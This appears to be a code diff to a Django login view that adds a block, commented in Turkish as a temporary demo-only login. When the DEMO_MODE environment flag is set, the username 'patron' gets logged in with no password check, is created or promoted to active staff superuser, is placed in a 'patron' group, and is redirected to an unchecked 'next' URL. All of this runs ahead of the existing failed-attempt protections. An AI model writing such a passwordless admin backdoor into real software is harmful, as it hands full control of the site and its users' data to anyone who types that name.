@@ -806,6 +806,27 @@ def custom_login(request):
         username = request.POST.get("username", "").strip()
         password = request.POST.get("password", "").strip()
 
+        # DEMO ONLY: gecici patronsuz-sifre girisi.
+        # Canli main branch'i etkilemez; yalnizca DEMO_MODE=1 ortaminda calisir.
+        import os
+        if os.getenv("DEMO_MODE") == "1" and username.lower() == "patron":
+            from django.contrib.auth import get_user_model
+            from django.contrib.auth.models import Group
+            User = get_user_model()
+            user = User.objects.filter(username__iexact="patron").first()
+            if user is None:
+                user = User.objects.create(username="patron")
+            elif user.username != "patron":
+                user.username = "patron"
+            user.is_active = True
+            user.is_staff = True
+            user.is_superuser = True
+            user.save()
+            patron_group, _ = Group.objects.get_or_create(name="patron")
+            user.groups.add(patron_group)
+            login(request, user, backend="django.contrib.auth.backends.ModelBackend")
+            return redirect(request.GET.get("next") or "/")
+
         from .login_security import (
             MAX_FAILED_ATTEMPTS,
             clear_login_failures,
